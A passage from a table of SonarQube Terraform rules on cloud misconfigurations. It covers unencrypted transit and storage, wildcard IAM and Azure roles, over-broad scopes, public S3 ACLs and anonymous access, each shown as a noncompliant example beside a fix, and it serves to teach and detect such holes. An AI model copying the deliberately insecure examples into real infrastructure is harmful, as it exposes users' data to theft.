resource &#34;aws_msk_cluster&#34; &#34;sensitive_data_cluster&#34; {
    encryption_info {
        encryption_in_transit {
            client_broker &#61; &#34;TLS_PLAINTEXT&#34; # Sensitive
            in_cluster &#61; false # Sensitive
        }
    }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Load Balancer Listeners</a>:</p>
<pre>
resource &#34;aws_lb_listener&#34; &#34;front_load_balancer&#34; {
  protocol &#61; &#34;HTTP&#34; # Sensitive

  default_action {
    type &#61; &#34;redirect&#34;

    redirect {
      protocol &#61; &#34;HTTP&#34;
    }
  }
}
</pre>
<p>HTTP protocol is used for <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service" rel="nofollow">GCP Region Backend
Services</a>:</p>
<pre>
resource &#34;google_compute_region_backend_service&#34; &#34;example&#34; {
  name                            &#61; &#34;example-service&#34;
  region                          &#61; &#34;us-central1&#34;
  health_checks                   &#61; [google_compute_region_health_check.region.id]
  connection_draining_timeout_sec &#61; 10
  session_affinity                &#61; &#34;CLIENT_IP&#34;
  load_balancing_scheme           &#61; &#34;EXTERNAL&#34;
  protocol                        &#61; &#34;HTTP&#34; # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/kinesis/" rel="nofollow">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
resource &#34;aws_kinesis_stream&#34; &#34;compliant_stream&#34; {
    encryption_type &#61; &#34;KMS&#34;
}
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/" rel="nofollow">Amazon ElastiCache</a>:</p>
<pre>
resource &#34;aws_elasticache_replication_group&#34; &#34;example&#34; {
    replication_group_id &#61; &#34;example&#34;
    replication_group_description &#61; &#34;example&#34;
    transit_encryption_enabled &#61; true
}
</pre>
<p>For <a href="https://aws.amazon.com/ecs/" rel="nofollow">Amazon ECS</a>:</p>
<pre>
resource &#34;aws_ecs_task_definition&#34; &#34;ecs_task&#34; {
  family &#61; &#34;service&#34;
  container_definitions &#61; file(&#34;task-definition.json&#34;)

  volume {
    name &#61; &#34;storage&#34;
    efs_volume_configuration {
      file_system_id &#61; aws_efs_file_system.fs.id
      transit_encryption &#61; &#34;ENABLED&#34;
    }
  }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html" rel="nofollow">Amazon OpenSearch domains</a>:</p>
<pre>
resource &#34;aws_elasticsearch_domain&#34; &#34;example&#34; {
  domain_name &#61; &#34;example&#34;
  domain_endpoint_options {
    enforce_https &#61; true
  }
  node_to_node_encryption {
    enabled &#61; true
  }
}
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,
allowing you to omit writing the <code>encryption_in_transit</code> configuration. However, if you need to configure it explicitly, this configuration
is compliant:</p>
<pre>
resource &#34;aws_msk_cluster&#34; &#34;sensitive_data_cluster&#34; {
    encryption_info {
        encryption_in_transit {
            client_broker &#61; &#34;TLS&#34;
            in_cluster &#61; true
        }
    }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Load Balancer Listeners</a>:</p>
<pre>
resource &#34;aws_lb_listener&#34; &#34;front_load_balancer&#34; {
  protocol &#61; &#34;HTTP&#34;

  default_action {
    type &#61; &#34;redirect&#34;

    redirect {
      protocol &#61; &#34;HTTPS&#34;
    }
  }
}
</pre>
<p>HTTPS protocol is used for <a href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service" rel="nofollow">GCP Region Backend
Services</a>:</p>
<pre>
resource &#34;google_compute_region_backend_service&#34; &#34;example&#34; {
  name                            &#61; &#34;example-service&#34;
  region                          &#61; &#34;us-central1&#34;
  health_checks                   &#61; [google_compute_region_health_check.region.id]
  connection_draining_timeout_sec &#61; 10
  session_affinity                &#61; &#34;CLIENT_IP&#34;
  load_balancing_scheme           &#61; &#34;EXTERNAL&#34;
  protocol                        &#61; &#34;HTTPS&#34;
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6303">
              terraform:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br /> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul><li> A malicious insider working at the cloud provider gains physical access to the storage device. </li><li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li></ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of services and security bypasses via data corruption or deletion </li></ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br /> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance" rel="nofollow">aws_db_instance</a> and <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster" rel="nofollow">aws_rds_cluster</a>:</p>
<pre>
resource &#34;aws_db_instance&#34; &#34;example&#34; {
  storage_encrypted &#61; false # Sensitive, disabled by default
}

resource &#34;aws_rds_cluster&#34; &#34;example&#34; {
  storage_encrypted &#61; false # Sensitive, disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance" rel="nofollow">aws_db_instance</a> and <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster" rel="nofollow">aws_rds_cluster</a>:</p>
<pre>
resource &#34;aws_db_instance&#34; &#34;example&#34; {
  storage_encrypted &#61; true
}

resource &#34;aws_rds_cluster&#34; &#34;example&#34; {
  storage_encrypted &#61; true
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html" rel="nofollow">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6302">
              terraform:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul><li> only require a subset of these permissions to perform the intended function. </li><li> have monitored activity showing that only a subset of these permissions is actually used. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy for AWS that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;example&#34; {
  name &#61; &#34;noncompliantpolicy&#34;

  policy &#61; jsonencode({
    Version   &#61; &#34;2012-10-17&#34;
    Statement &#61; [
      {
        Action   &#61; [
          &#34;*&#34; # Sensitive
        ]
        Effect   &#61; &#34;Allow&#34;
        Resource &#61; [
          aws_s3_bucket.mybucket.arn
        ]
      }
    ]
  })
}
</pre>
<p>A customer-managed policy for GCP that grants all permissions by using the actions admin role <code>role</code> property:</p>
<pre>
resource &#34;google_project_iam_binding&#34; &#34;example&#34; {
  project &#61; &#34;example&#34;
  role    &#61; &#34;roles/owner&#34; # Sensitive

  members &#61; [
    &#34;user:jane&#64;example.com&#34;,
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy for AWS that grants only the required permissions:</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;example&#34; {
  name &#61; &#34;compliantpolicy&#34;

  policy &#61; jsonencode({
    Version   &#61; &#34;2012-10-17&#34;
    Statement &#61; [
      {
        Action   &#61; [
          &#34;s3:GetObject&#34;
        ]
        Effect   &#61; &#34;Allow&#34;
        Resource &#61; [
          aws_s3_bucket.mybucket.arn
        ]
      }
    ]
  })
}
</pre>
<p>A customer-managed policy for GCP that grants restricted permissions by using the actions admin role <code>role</code> property:</p>
<pre>
resource &#34;google_project_iam_binding&#34; &#34;example&#34; {
  project &#61; &#34;example&#34;
  role    &#61; &#34;roles/actions.Viewer&#34;

  members &#61; [
    &#34;user:jane&#64;example.com&#34;,
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cloud.google.com/iam/docs/understanding-roles" rel="nofollow">Google Cloud Documentation</a> - Understanding roles </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6308">
              terraform:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>
<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.
Enabling encryption at rest will help protect:</p>
<ul><li> indices </li><li> logs </li><li> swap files </li><li> data in the application directory </li><li> automated snapshots </li></ul>
<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>
<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain" rel="nofollow">aws_elasticsearch_domain</a>:</p>
<pre>
resource &#34;aws_elasticsearch_domain&#34; &#34;elasticsearch&#34; {
  encrypt_at_rest {
    enabled &#61; false  # Sensitive, disabled by default
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain" rel="nofollow">aws_elasticsearch_domain</a>:</p>
<pre>
resource &#34;aws_elasticsearch_domain&#34; &#34;elasticsearch&#34; {
  encrypt_at_rest {
    enabled &#61; true
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html" rel="nofollow">AWS Documentation</a> - Encryption of
  data at rest for Amazon Elasticsearch Service </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6385">
              terraform:S6385
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a custom role for a Subscription or a Management group that allows all actions will give them the same capabilities as the built-in Owner
role. It’s recommended to limit the number of subscription owners in order to mitigate the risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when a custom role has an assignable scope set to a Subscription or a Management Group and allows all actions
(<code>*</code>) ¨</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre>
resource &#34;azurerm_role_definition&#34; &#34;example&#34; { # Sensitive
  name        &#61; &#34;example&#34;
  scope       &#61; data.azurerm_subscription.primary.id

  permissions {
    actions     &#61; [&#34;*&#34;]
    not_actions &#61; []
  }

  assignable_scopes &#61; [
    data.azurerm_subscription.primary.id
  ]
}
</pre>
<h4>Compliant solution</h4>
<pre>
resource &#34;azurerm_role_definition&#34; &#34;example&#34; {
  name        &#61; &#34;example&#34;
  scope       &#61; data.azurerm_subscription.primary.id

  permissions {
    actions     &#61; [&#34;Microsoft.Compute/*&#34;]
    not_actions &#61; []
  }

  assignable_scopes &#61; [
    data.azurerm_subscription.primary.id
  ]
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles" rel="nofollow">Azure Documentation</a> - Azure custom roles </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6387">
              terraform:S6387
            </a>
          </td>
          <td>
            <details>
              <p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources
called &#34;scope&#34;.</p>
<p>The widest scopes a role can be assigned to are:</p>
<ul><li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li><li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li></ul>
<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest
scope possible helps separate duties and limits what resources are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li><li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the scope of the role assignment to a Resource or Resource Group. </li><li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;azurerm_role_assignment&#34; &#34;example&#34; {
  scope                &#61; data.azurerm_subscription.primary.id # Sensitive
  role_definition_name &#61; &#34;Reader&#34;
  principal_id         &#61; data.azuread_user.user.object_id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;azurerm_role_assignment&#34; &#34;example&#34; {
  scope                &#61; azurerm_resource_group.example.id
  role_definition_name &#61; &#34;Reader&#34;
  principal_id         &#61; data.azuread_user.user.object_id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview" rel="nofollow">Azure Documentation</a> - Understand scope for Azure
  RBAC </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6265">
              terraform:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul><li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively &#34;read&#34; and &#34;read and write&#34; privileges to everyone in the world
  (<code>AllUsers</code> group). </li><li> <code>AuthenticatedRead</code> grants &#34;read&#34; privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context
of canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>public-read-write</code> access
control:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;mynoncompliantbucket&#34; { # Sensitive
  bucket &#61; &#34;mynoncompliantbucketname&#34;
  acl    &#61; &#34;public-read-write&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;mycompliantbucket&#34; { # Compliant
  bucket &#61; &#34;mycompliantbucketname&#34;
  acl    &#61; &#34;private&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html" rel="nofollow">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6381">
              terraform:S6381
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul><li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li><li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li><li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li><li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. There is a
  risk if you answered yes to any of these questions. </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the assignment of Owner roles to less than 3 people or service principals. </li><li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li><li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;azurerm_role_assignment&#34; &#34;example&#34; {
  scope                &#61; azurerm_resource_group.example.id
  role_definition_name &#61; &#34;Owner&#34; # Sensitive
  principal_id         &#61; data.azuread_user.example.id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;azurerm_role_assignment&#34; &#34;example&#34; {
  scope                &#61; azurerm_resource_group.example.id
  role_definition_name &#61; &#34;Azure Maps Data Reader&#34;
  principal_id         &#61; data.azuread_user.example.id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles" rel="nofollow">Azure Documentation</a> - Azure built-in roles </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6380">
              terraform:S6380
            </a>
          </td>
          <td>
            <details>
              <p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>
<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>
<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security
incidents.</p>
<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations
(Google, Microsoft, etc.) or native Azure mechanisms.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> This Azure resource stores or processes sensitive data. </li><li> Compliance policies require access to this resource to be authenticated. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable authentication in this Azure resource, and disable anonymous access.</p>
<p>If only Basic Authentication is available, enable it.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;azurerm_function_app&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;

  auth_settings {
    enabled &#61; false # Sensitive
  }

  auth_settings {
    enabled &#61; true
    unauthenticated_client_action &#61; &#34;AllowAnonymous&#34; # Sensitive
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;azurerm_api_management_api&#34; &#34;example&#34; { # Sensitive, the openid_authentication block is missing
  name &#61; &#34;example-api&#34;
}

resource &#34;azurerm_api_management&#34; &#34;example&#34; {
  sign_in {
    enabled &#61; false # Sensitive
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource &#34;azurerm_data_factory_linked_service_sftp&#34; &#34;example&#34; {
  authentication_type &#61; &#34;Anonymous&#34;
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/" rel="nofollow">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource &#34;azurerm_storage_account&#34; &#34;example&#34; {
  allow_blob_public_access &#61; true # Sensitive
}

resource &#34;azurerm_storage_container&#34; &#34;example&#34; {
  container_access_type &#61; &#34;blob&#34; # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/" rel="nofollow">Redis Caches</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
resource &#34;azurerm_redis_cache&#34; &#34;example&#34; {
  name &#61; &#34;example-cache&#34;

  redis_configuration {
    enable_authentication &#61; false # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;azurerm_function_app&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;

  auth_settings {
    enabled &#61; true
    unauthenticated_client_action &#61; &#34;RedirectToLoginPage&#34;
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;azurerm_api_management_api&#34; &#34;example&#34; {
  name &#61; &#34;example-api&#34;

  openid_authentication {
    openid_provider_name &#61; azurerm_api_management_openid_connect_provider.example.name
  }
}

resource &#34;azurerm_api_management&#34; &#34;example&#34; {
  sign_in {
    enabled &#61; true
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource &#34;azurerm_data_factory_linked_service_sftp&#34; &#34;example&#34; {
  authentication_type &#61; &#34;Basic&#34;
  username            &#61; local.creds.username
  password            &#61; local.creds.password
}

resource &#34;azurerm_data_factory_linked_service_odata&#34; &#34;example&#34; {
  basic_authentication {
    username &#61; local.creds.username
    password &#61; local.creds.password
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/" rel="nofollow">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource &#34;azurerm_storage_account&#34; &#34;example&#34; {
  allow_blob_public_access &#61; true
}

